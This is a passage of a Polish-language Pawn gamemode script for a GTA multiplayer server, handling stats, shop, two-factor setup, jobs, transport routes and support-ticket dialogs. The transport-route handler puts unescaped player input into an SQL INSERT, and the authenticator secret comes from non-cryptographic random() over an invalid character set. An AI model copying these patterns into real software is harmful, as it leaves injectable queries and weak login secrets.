			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa na arenach: "C_WHITE"%d, %d, %d, %d, %d, %d, %d, %d\n", statsstr, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane walki solo: "C_WHITE"%d\n", statsstr, solo);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Najszybszy czas glitch: "C_WHITE"%0.4fs\n\n", statsstr, cbug);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Z³apane potwory: "C_WHITE"%d\n", statsstr, potwory);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wykonane questy: "C_WHITE"%d\n\n", statsstr, questy);
			if(house > -1) format(statsstr, sizeof(statsstr), "%s"C_GREEN"Posiada dom o ID "C_WHITE"%d"C_GREEN".\n", statsstr, house);
			m_query("SELECT modelid, dist FROM privcars WHERE ownerid = %d", choosedid);
			mysql_store_result();
			if(mysql_num_rows() > 0) {
				mysql_fetch_row(sqlquery2, " ");
				mysql_free_result();
				new model, Float:distance;
				sscanf(sqlquery2, "if", model, distance);
				format(statsstr, sizeof(statsstr), "%s{CD82F5}Posiada prywatny pojazd "C_NICK"%s "C_YELLOW"(%.1fkm)\n\n", statsstr, VehicleNames[model - 400], distance); }
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, nickstr, statsstr, "Zamknij", "");
        }
        case DIALOG_RESPONSE_PLAYERIP:
        {
            if (!response) return 1;
			new choosedid, _s[4];
			strmid(_s, inputtext, 0, strfind(inputtext, "."));
			choosedid = strval(_s);
			new nickstr[128], statsstr[4096], sqlquery[1024], sqlquery2[1024];
			new id, user[20], kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[8], czat, solo, potwory, zabawy, visits, cbug, questy, house;
			m_query("SELECT id, username, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a1, a2, a3, a4, a5, a6, a7, a8, czat, solo, potwory, zabawy, visits, cbug, questy, house FROM players WHERE id = %d", choosedid);
			mysql_store_result();
			mysql_fetch_row(sqlquery, " ");
			mysql_free_result();
			sscanf(sqlquery, "is[20]iiiiiiiiiiiiiiiiiiiiiiifii", id, user, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], czat, solo, potwory, zabawy, visits, cbug, questy, house);
			format(nickstr, sizeof(nickstr), ""C_BLUE1"%s "C_WHITE"("C_BLUE1"UID %d"C_WHITE")", user, id);
			format(statsstr, sizeof(statsstr), ""C_WHITE"%d "C_BLUE1"EXP ("C_WHITE"%d"C_BLUE1"), "C_WHITE"%d"C_BLUE1"$\n", exp, level, waluta);
			if(vip > gettime()) format(statsstr, sizeof(statsstr), "%s"C_YELLOW"Posiada uprawnienia VIP\n", statsstr);
			if(rank == 0 && vip < gettime()) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "C_WHITE"Gracz\n", statsstr);
			if(rank == 1) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "JUNIOR"\n\n", statsstr);
			if(rank == 2) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "ADMIN"\n\n", statsstr);
			if(rank == 3) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "VHA"\n\n", statsstr);
			if(rank == 4) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "HA"\n\n", statsstr);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa/Zgony: "C_WHITE"%d/%d\n", statsstr, kills, deaths);
			format(statsstr, sizeof(statsstr), "%s{FF2600}Poziom ostrze¿eñ: %d{E50000}/{FF2600}100\n\n", statsstr, warny);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ogólny czas gry: "C_WHITE"%d"C_BLUE1"h "C_WHITE"%d"C_BLUE1"m\n", statsstr, hours, minutes);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wizyty na serwerze: "C_WHITE"%d\n\n", statsstr, visits);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ukoñczone wyzwania Reflex: "C_WHITE"%d\n", statsstr, czat);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane zabawy: "C_WHITE"%d\n", statsstr, zabawy);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa na arenach: "C_WHITE"%d, %d, %d, %d, %d, %d, %d, %d\n", statsstr, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane walki solo: "C_WHITE"%d\n", statsstr, solo);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Najszybszy czas glitch: "C_WHITE"%0.4fs\n\n", statsstr, cbug);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Z³apane potwory: "C_WHITE"%d\n", statsstr, potwory);
			format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wykonane questy: "C_WHITE"%d\n\n", statsstr, questy);
			if(house > -1) format(statsstr, sizeof(statsstr), "%s"C_GREEN"Posiada dom o ID "C_WHITE"%d"C_GREEN".\n", statsstr, house);
			m_query("SELECT modelid, dist FROM privcars WHERE ownerid = %d", choosedid);
			mysql_store_result();
			if(mysql_num_rows() > 0) {
				mysql_fetch_row(sqlquery2, " ");
				mysql_free_result();
				new model, Float:distance;
				sscanf(sqlquery2, "if", model, distance);
				format(statsstr, sizeof(statsstr), "%s{CD82F5}Posiada prywatny pojazd "C_NICK"%s "C_YELLOW"(%.1fkm)\n\n", statsstr, VehicleNames[model - 400], distance); }
			mysql_free_result();
			return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, nickstr, statsstr, "Zamknij", "");
        }
        case DIALOG_SKLEP:
        {
		    if (!response) return 1;
			switch (listitem) {
				case 0: return cmd_sms(playerid, " ");
				case 1: {
				    if(Player[playerid][Vip] > gettime()) return DialogError(playerid, "{FFFF00}Posiadasz ju¿ aktywne uprawnienia VIP.");
				    if(Player[playerid][vCash] < 10) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 10;
				    Player[playerid][Vip] = gettime() + 86400 * 30;
				    vips++;
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Uprawnienia VIP aktywne."); }
				case 2: {
				    if(Player[playerid][Vip] > gettime()) return DialogError(playerid, "{FFFF00}Posiadasz ju¿ aktywne uprawnienia VIP.");
				    if(Player[playerid][vCash] < 25) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 25;
				    Player[playerid][Vip] = gettime() + 86400 * 90;
				    vips++;
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Uprawnienia VIP aktywne."); }
				case 3: {
				    if(Player[playerid][Vip] > gettime()) return DialogError(playerid, "{FFFF00}Posiadasz ju¿ aktywne uprawnienia VIP.");
				    if(Player[playerid][vCash] < 50) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 50;
				    Player[playerid][Vip] = gettime() + 86400 * 365;
				    vips++;
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Uprawnienia VIP aktywne."); }
				case 4: {
				    if(Player[playerid][vCash] < 7) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 7;
				    AddExp(playerid, 5000);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP dodany."); }
				case 5: {
				    if(Player[playerid][vCash] < 21) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 21;
				    AddExp(playerid, 20000);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP dodany."); }
				case 6: {
				    if(Player[playerid][vCash] < 50) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 50;
				    AddExp(playerid, 50000);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP dodany."); }
				case 7: {
				    if(Player[playerid][vCash] < 90) return DialogError(playerid, "{FFFF00}Brak wymaganej kwoty na koncie.");
				    Player[playerid][vCash] -= 90;
				    AddExp(playerid, 100000);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"EXP dodany."); }
			}
        }
        case DIALOG_AUTHCODE:
        {
			if(!response) return 1;
			if(response) {
			    if(SQLInjection(inputtext)) {
					if(pAch[playerid][1] < 1) {
						pAch[playerid][1] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
						return 1; }
				if(strlen(inputtext) < 6 || !IsNumeric(inputtext)) return 1;
			 		new heh = GoogleAuthenticatorCode(Player[playerid][TempAuth], gettime());
					new kod = strval(inputtext);
					if(kod != heh) DialogError(playerid, "{FFFF00}Nieprawid³owy kod.");
					else {
						format(Player[playerid][Auth], 17, Player[playerid][TempAuth]);
						SaveAllData(playerid);
					 	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Pod³¹czenie przebieg³o pomyœlnie. Od teraz przy logowaniu bêdziesz proszony dodatkowo o kod z aplikacji."); } }
        }
		case DIALOG_KONTO: 
		{
		    if (!response) return 1;
			switch (listitem) {
				case 0: {
				    if(Player[playerid][Exp] < 500) return DialogError(playerid, "{FFFF00}Zmiana nicku kosztuje 500 EXP.");
				    if(Player[playerid][NickChange] > gettime()) return DialogError(playerid, "{FFFF00}Ostatnio dokonywa³eœ ju¿ zmiany swojego nicku.");
				    return ShowPlayerDialog(playerid, DIALOG_NICKCHANGE, DIALOG_STYLE_INPUT, ""C_BLUE1"Zmiana nicku", ""C_BLUE1"WprowadŸ poni¿ej swój nowy nick.", "Zmieñ", "Zamknij"); }
				case 1: return ShowPlayerDialog(playerid, DIALOG_PASSCHANGE, DIALOG_STYLE_PASSWORD, ""C_BLUE1"Zmiana has³a", ""C_BLUE1"WprowadŸ poni¿ej swoje nowe has³o.", "Zmieñ", "Zamknij");
				case 2: {
					if(strlen(Player[playerid][Auth]) > 1) {
						new strdg[256];
						format(strdg, sizeof(strdg), ""C_YELLOW"Czy chcesz wy³¹czyæ weryfikacjê dwuetapow¹?\nWygenerowany wczeœniej klucz nie bêdzie ju¿ wa¿ny dla tego konta.");
						return ShowPlayerDialog(playerid, DIALOG_AUTHOFF, DIALOG_STYLE_MSGBOX, "{a0a0a0}Google Authenticator", strdg, "Wy³¹cz", "Zamknij"); }
   					new Litery[] = {'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'O', 'P'
					, 'A', 'D', 'F', 'G', 'H', 'J', 'K', 'L'
					, 'Z', 'X', 'C', 'V', 'B', 'N', 'M'
					, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p'
					, 'a', 'd', 'f', 'g', 'h', 'j', 'k', 's'
					, 'z', 'x', 'c', 'v', 'b', 'n', 'm'};
					Loop(letterid, 17) format(Player[playerid][TempAuth][letterid], 2, "%c", Litery[random(sizeof Litery)]);
				    new strau[2048];
					format(strau, sizeof(strau), "%s"C_YELLOW"Czy chcesz w³¹czyæ weryfikacjê dwuetapow¹ dla tego konta za pomoc¹ aplikacji {a0a0a0}Google Authenticator"C_YELLOW"?\n\n", strau);
					format(strau, sizeof(strau), "%s{a0a0a0}Google Authenticator"C_YELLOW" jest aplikacj¹ na systemy mobilne Android oraz iOS, generuj¹c¹ kody weryfikacyjne.\n", strau);
					format(strau, sizeof(strau), "%s"C_YELLOW"Przy wchodzeniu na serwer oprócz podania has³a do konta bêdziesz zmuszony podaæ kod z aplikacji znajduj¹cy siê na telefonie.\n\n", strau);
					format(strau, sizeof(strau), "%s{FF0000}Twój klucz do aplikacji: "C_YELLOW"%s\n\n", strau, Player[playerid][TempAuth]);
					format(strau, sizeof(strau), "%s"C_YELLOW"WejdŸ w aplikacjê na telefonie i kliknij symbol "C_LOLIVE"+"C_YELLOW".\n", strau);
					format(strau, sizeof(strau), "%s"C_YELLOW"W polu {FF0000}wpisz nazwê konta "C_YELLOW"wpisz nazwê u³atwiaj¹c¹ identyfikacje naszego serwera.\n", strau);
					format(strau, sizeof(strau), "%s"C_YELLOW"W polu {FF0000}podaj klucz "C_YELLOW"wpisz klucz podany powy¿ej.\n\nWpisz poni¿ej kod weryfikacyjny, który dostaniesz po dodaniu klucza.", strau);
                    ShowPlayerDialog(playerid, DIALOG_AUTHCODE, DIALOG_STYLE_INPUT, "{a0a0a0}Google Authenticator", strau, "Zweryfikuj", "Zamknij"); }
				case 3: return cmd_vmode(playerid, " ");
				case 4: {
                    gettime(hour, minute, second);
                    if(Player[playerid][HasRealTime]) {
                        Player[playerid][HasRealTime] = false;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Realny czas wy³¹czony."); }
                    else {
                        Player[playerid][HasRealTime] = true;
                        SetPlayerTime(playerid, hour, minute);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Realny czas w³¹czony."); }
				}
				case 5: {
                    if(Player[playerid][HasSounds]) {
                        Player[playerid][HasSounds] = false;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Dodatkowe efekty dŸwiêkowe wy³¹czone."); }
                    else {
                        Player[playerid][HasSounds] = true;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Dodatkowe efekty dŸwiêkowe w³¹czone."); }
				}
				case 6: {
                    if(Player[playerid][HasUnlockedSolo]) {
                        Player[playerid][HasUnlockedSolo] = false;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Zaproszenia na pojedynki solo wy³¹czone."); }
                    else {
                        Player[playerid][HasUnlockedSolo] = true;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Zaproszenia na pojedynki solo w³¹czone."); }
				}
				case 7: return ShowPlayerDialog(playerid, DIALOG_FIGHT, DIALOG_STYLE_LIST, ""C_WHITE"Wybierz styl walki", ""C_WHITE"Normalny\nBoxing\nKungfu", "Wybierz", "Zamknij");
				case 8: return ShowPlayerDialog(playerid, DIALOG_GONG, DIALOG_STYLE_LIST, ""C_WHITE"Wybierz dŸwiêk gongu", ""C_WHITE"17802\n1002\n1084\n1130", "Wybierz", "Zamknij");
				case 9: {
				    if(!DiscordConnected[playerid] && DiscordSendedID != playerid) return SendClientMessage(playerid, -1, ""C_RED"Twoje konto nie by³o ³¹czone z kontem Discord.");
				    if(!DiscordConnected[playerid] && DiscordSendedID == playerid) {
				        format(DiscordUser[playerid], 128, "%s", lastdiscordname);
				        DiscordConnected[playerid] = true;
				        SaveAllData(playerid);
				        DiscordChat[playerid] = true;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Konta po³¹czone pomyœlnie!"); }
					if(DiscordConnected[playerid] && !DiscordChat[playerid]) {
					    DiscordChat[playerid] = true;
					    return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Widocznoœæ czatu w³¹czona."); }
					if(DiscordConnected[playerid] && DiscordChat[playerid]) {
					    DiscordChat[playerid] = false;
					    return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Widocznoœæ czatu wy³¹czona."); } }
			}
		}
		case DIALOG_FIGHT:
		{
		    if(!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
		        	case 0: {
              			SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Styl walki zmieniony."); }
		        	case 1: {
              			SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Styl walki zmieniony."); }
		        	case 2: {
              			SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Styl walki zmieniony."); }
				}
			}
		}
		case DIALOG_GONG:
		{
		    if(!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
		        	case 0: {
				 		Player[playerid][Gong] = 0;
				 		PlayerPlaySound(playerid, 17802, 0.0, 0.0, 0.0);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"DŸwiêk gongu zmieniony."); }
		        	case 1: {
				 		Player[playerid][Gong] = 1;
				 		PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"DŸwiêk gongu zmieniony."); }
		        	case 2: {
				 		Player[playerid][Gong] = 2;
				 		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"DŸwiêk gongu zmieniony."); }
		        	case 3: {
				 		Player[playerid][Gong] = 3;
				 		PlayerPlaySound(playerid, 1149, 0.0, 0.0, 0.0);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"DŸwiêk gongu zmieniony."); }
				}
			}
		}
		case DIALOG_PRACA:
		{
		    if (!response) return 1;
		    switch (listitem)
			{
				case 0: {
				    new dstr[256];
				    format(dstr, sizeof(dstr), ""C_WHITE"1. "C_BLUE1"Naziemna ("C_WHITE"Burrito"C_BLUE1")\n"C_WHITE"2. "C_BLUE1"Powietrzna ("C_WHITE"Shamal"C_BLUE1")\n"C_WHITE"3. "C_BLUE1"Powietrzna ("C_WHITE"Maverick"C_BLUE1")\n"C_WHITE"4. "C_BLUE1"Morska ("C_WHITE"Jetmax"C_BLUE1")");
					return ShowPlayerDialog(playerid, DIALOG_SPEDYCJA, DIALOG_STYLE_LIST, ""C_BLUE1"Wybierz rodzaj spedycji", dstr, "Wybierz", "Zamknij"); }
				case 1: Koszenie(playerid);
				case 2: ZrzutPaczki(playerid);
				case 3: return cmd_kopalnia(playerid, " ");
				case 4: Nurek(playerid);
				case 5: Zbieranie(playerid);
				case 6: Czyszczenie(playerid);
				case 7: Taksowkarz(playerid);
				case 8: return cmd_wedkarstwo(playerid, " ");
			}
		}
		case DIALOG_KOPALNIA:
		{
		    if (!response) return 1;
		    switch (listitem)
			{
				case 0: {
					if(Player[playerid][r1] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r1] -= 100;
					AddExp(playerid, 40);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 1: {
					if(Player[playerid][r2] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r2] -= 100;
					AddExp(playerid, 35);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 2: {
					if(Player[playerid][r3] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r3] -= 100;
					AddExp(playerid, 55);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 3: {
					if(Player[playerid][r4] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r4] -= 100;
					AddExp(playerid, 175);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 4: {
					if(Player[playerid][r5] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r5] -= 100;
					AddExp(playerid, 125);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 5: {
					if(Player[playerid][r6] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r6] -= 100;
					AddExp(playerid, 150);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
				case 6: {
					if(Player[playerid][r7] < 100) return SendClientMessage(playerid, RED, "Brak surowców.");
					Player[playerid][r7] -= 100;
					AddExp(playerid, 200);
					return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Surowiec sprzedany."); }
			}
		}
		case DIALOG_TRANSPORTCREATE:
		{
		    if (!response) return 1;
			new name[64], Float:x, Float:y, Float:z;
			if(strlen(inputtext) > 64) return 1;
			format(name, sizeof(name), "%s", inputtext);
			GetPlayerPos(playerid, x, y, z);
			m_query("SELECT id FROM transport");
			mysql_store_result();
			new transporty = mysql_num_rows();
			mysql_free_result();
			m_query("INSERT INTO transport (id, type, name, x, y, z) VALUES (%d, %d, '%s', %.3f, %.3f, %.3f)", transporty, cSpedition[playerid], name, x, y, z);
			return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Trasa transportowa stworzona.");
		}
		case DIALOG_SPEDYCJA:
		{
		    if (!response) return 1;
  		    new se[1024], ide[MAX_SPEDITIONS], namee[64][MAX_SPEDITIONS], Float:x[MAX_SPEDITIONS], Float:y[MAX_SPEDITIONS], Float:z[MAX_SPEDITIONS], dialog[2048], Float:km[MAX_SPEDITIONS];
		    switch (listitem)
		    {
		        case 0:
		        {
		            m_query("SELECT id FROM transport WHERE type = 1");
		            mysql_store_result();
					new speditions = mysql_num_rows();
  				    mysql_free_result();
					Loop(transportid, speditions)
					{
					    m_query("SELECT id, name, x, y, z FROM transport WHERE type = 1 && id = %d", transportid);
					    mysql_store_result();
         				mysql_fetch_row(se);
         				mysql_free_result();
					    sscanf(se, "p<|>is[64]fff", ide[transportid], namee[transportid], x[transportid], y[transportid], z[transportid]);
					    km[transportid] = GetDistanceBetweenPoints3D(2176.2334,1386.5212,10.9534,x[transportid],y[transportid],z[transportid]);
					    format(dialog, sizeof(dialog), "%s%d. %s - %.0fm\n", dialog, ide[transportid], namee[transportid], km[transportid]);
					}
					ShowPlayerDialog(playerid, DIALOG_T1, DIALOG_STYLE_LIST, ""C_BLUE1"Naziemna ("C_WHITE"Burrito"C_BLUE1")", dialog, "Wybierz", "Zamknij");
					mysql_free_result();
		        }
		        case 1:
		        {
					Loop(transportid, 40)
					{
  		           		m_query("SELECT id FROM transport WHERE type = 2 && id = %d", transportid);
		            	mysql_store_result();
						new spedition = mysql_num_rows();
						mysql_free_result();
						if(spedition > 0)
						{
					    	m_query("SELECT id, name, x, y, z FROM transport WHERE type = 2 && id = %d", transportid);
					    	mysql_store_result();
         					mysql_fetch_row(se);
         					mysql_free_result();
					    	sscanf(se, "p<|>is[64]fff", ide[transportid], namee[transportid], x[transportid], y[transportid], z[transportid]);
					    	km[transportid] = GetDistanceBetweenPoints3D(1477.6929,1730.4885,11.7901,x[transportid],y[transportid],z[transportid]);
					    	format(dialog, sizeof(dialog), "%s%d. %s - %.0fm\n", dialog, ide[transportid], namee[transportid], km[transportid]);
						}
					}
					ShowPlayerDialog(playerid, DIALOG_T2, DIALOG_STYLE_LIST, ""C_BLUE1"Powietrzna ("C_WHITE"Shamal"C_BLUE1")", dialog, "Wybierz", "Zamknij");
					mysql_free_result();
		        }
		        case 2:
		        {
					Loop(transportid, 60)
					{
    		       		m_query("SELECT id FROM transport WHERE type = 3 && id = %d", transportid);
		            	mysql_store_result();
						new spedition = mysql_num_rows();
						mysql_free_result();
						if(spedition > 0)
						{
					    	m_query("SELECT id, name, x, y, z FROM transport WHERE type = 3 && id = %d", transportid);
					    	mysql_store_result();
         					mysql_fetch_row(se);
         					mysql_free_result();
					    	sscanf(se, "p<|>is[64]fff", ide[transportid], namee[transportid], x[transportid], y[transportid], z[transportid]);
					    	km[transportid] = GetDistanceBetweenPoints3D(2211.0562,1408.3590,16.7174,x[transportid],y[transportid],z[transportid]);
					    	format(dialog, sizeof(dialog), "%s%d. %s - %.0fm\n", dialog, ide[transportid], namee[transportid], km[transportid]);
						}
					}
					ShowPlayerDialog(playerid, DIALOG_T3, DIALOG_STYLE_LIST, ""C_BLUE1"Powietrzna ("C_WHITE"Maverick"C_BLUE1")", dialog, "Wybierz", "Zamknij");
					mysql_free_result();
		        }
		        case 3:
		        {
					Loop(transportid, 80)
					{
    		       		m_query("SELECT id FROM transport WHERE type = 4 && id = %d", transportid);
		            	mysql_store_result();
						new spedition = mysql_num_rows();
						mysql_free_result();
						if(spedition > 0)
						{
					    	m_query("SELECT id, name, x, y, z FROM transport WHERE type = 4 && id = %d", transportid);
					    	mysql_store_result();
         					mysql_fetch_row(se);
         					mysql_free_result();
					    	sscanf(se, "p<|>is[64]fff", ide[transportid], namee[transportid], x[transportid], y[transportid], z[transportid]);
					    	km[transportid] = GetDistanceBetweenPoints3D(1631.4419,568.3058,0.0812,x[transportid],y[transportid],z[transportid]);
					    	format(dialog, sizeof(dialog), "%s%d. %s - %.0fm\n", dialog, ide[transportid], namee[transportid], km[transportid]);
						}
					}
					ShowPlayerDialog(playerid, DIALOG_T4, DIALOG_STYLE_LIST, ""C_BLUE1"Morska ("C_WHITE"Jetmax"C_BLUE1")", dialog, "Wybierz", "Zamknij");
					mysql_free_result();
		        }
			}
		}
		case DIALOG_RADIO: 
		{
		    if (!response) return 1;
			switch (listitem) {
				case 0: PlayAudioStreamForPlayer(playerid, RADIO);
				case 1: PlayAudioStreamForPlayer(playerid, "http://www.rmfon.pl/n/rmffm.pls");
				case 2: PlayAudioStreamForPlayer(playerid, "http://www.rmfon.pl/n/rmfmaxxx.pls");
				case 3: PlayAudioStreamForPlayer(playerid, "http://plus-warszawa-01.eurozet.pl:8500/listen.pls");
				case 4: PlayAudioStreamForPlayer(playerid, "http://www.radio.pionier.net.pl/stream.pls?radio=radio88");
				case 5: PlayAudioStreamForPlayer(playerid, "https://radioparty.pl/play/glowny.m3u");
				case 6: StopAudioStreamForPlayer(playerid);
			}
		}
		case DIALOG_EKWIPUNEK: 
		{
		    if (!response) return 1;
			switch (listitem)
			{
				case 0: return UseItem(playerid, 1);
				case 1: return UseItem(playerid, 2);
				case 2: return UseItem(playerid, 3);
				case 3: return UseItem(playerid, 4);
				case 4: return UseItem(playerid, 5);
				case 5: return UseItem(playerid, 6);
				case 6: return UseItem(playerid, 7);
				case 7: return UseItem(playerid, 8);
			}
		}
		case DIALOG_KLANY: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

				if(Player[playerid][Gang] == choosedid) return cmd_clan(playerid, inputtext);
				else
				{
			    	new s[1024], name[20], gid, gpid, dialog[1024];
					m_query("SELECT id, username, playerid FROM players WHERE gang = %d", choosedid);
					mysql_store_result();

					while(mysql_fetch_row(s, " "))
					{
						sscanf(s, "is[20]i", gid, name, gpid);

						if(gpid > -1)
						{
							format(dialog, sizeof(dialog), "%s"C_WHITE"(UID "C_BLUE1"%d"C_WHITE") %s "C_GREEN"[online (%d)]\n", dialog, gid, name, gpid);
						}
						else format(dialog, sizeof(dialog), "%s"C_WHITE"(UID "C_BLUE1"%d"C_WHITE") %s\n", dialog, gid, name);
					}
					mysql_free_result();
					return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, gName[choosedid], dialog, "Zamknij", "");
				}
			}
		}
		case DIALOG_SUPPORTSELA: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _s[4], subject[256], sql[2048], dialog[1024], reply[256], msg[256], suid;

				strmid(_s, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_s);
				SelectedTicket[playerid] = choosedid;
				m_query("SELECT subject, suid, lastmsg, lastreply FROM support WHERE ticket = %d", choosedid);
				mysql_store_result();
				while(mysql_fetch_row(sql))
				{
					sscanf(sql, "p<|>s[256]is[256]s[256]", subject, suid, msg, reply);
					mysql_free_result();
					new replylen = strlen(reply);
					if(replylen > 5) format(dialog, sizeof(dialog), ""C_BLUE1"Temat: "C_WHITE"%s\n"C_BLUE1"UID wysy³aj¹cego: "C_WHITE"%d\n\n%s\n\n"C_RED"%s\n\n"C_BLUE1"Wpisz poni¿ej odpowiedŸ, któr¹ chcesz wys³aæ.", subject, suid, reply, msg);
					else format(dialog, sizeof(dialog), ""C_BLUE1"Temat: "C_WHITE"%s\n"C_BLUE1"UID wysy³aj¹cego: "C_WHITE"%d\n\n%s\n\n"C_BLUE1"Wpisz poni¿ej odpowiedŸ, któr¹ chcesz wys³aæ.", subject, suid, msg);
					return ShowPlayerDialog(playerid, DIALOG_SUPPORTREPLYA, DIALOG_STYLE_INPUT, ""C_BLUE1"Support", dialog, "Wyœlij", "Zamknij");
				}
			}
		}
		case DIALOG_SUPPORTSEL: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _s[4];
				strmid(_s, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_s);
				SelectedTicket[playerid] = choosedid;
				ShowPlayerDialog(playerid, DIALOG_SUPPORTSEL2, DIALOG_STYLE_LIST, ""C_BLUE1"Support", ""C_WHITE"SprawdŸ stan wiadomoœci\n"C_RED"Zamknij temat", "Wyœlij", "Zamknij");
			}
		}
		case DIALOG_SUPPORTSEL2:
		{
		    if (!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0:
		            {
          				new subject[256], sql[2048], dialog[1024], reply[256], msg[256], status;
          				m_query("SELECT subject, lastmsg, lastreply, status FROM support WHERE ticket = %d", SelectedTicket[playerid]);
						mysql_store_result();
						while(mysql_fetch_row(sql))
						{
							sscanf(sql, "p<|>s[256]s[256]s[256]i", subject, msg, reply, status);
							mysql_free_result();
							new replylen = strlen(reply);
							if(replylen > 5) format(dialog, sizeof(dialog), ""C_BLUE1"Temat: "C_WHITE"%s\n\n%s\n\n"C_RED"%s\n\n"C_BLUE1"Wpisz poni¿ej odpowiedŸ, któr¹ chcesz wys³aæ.", subject, reply, msg);
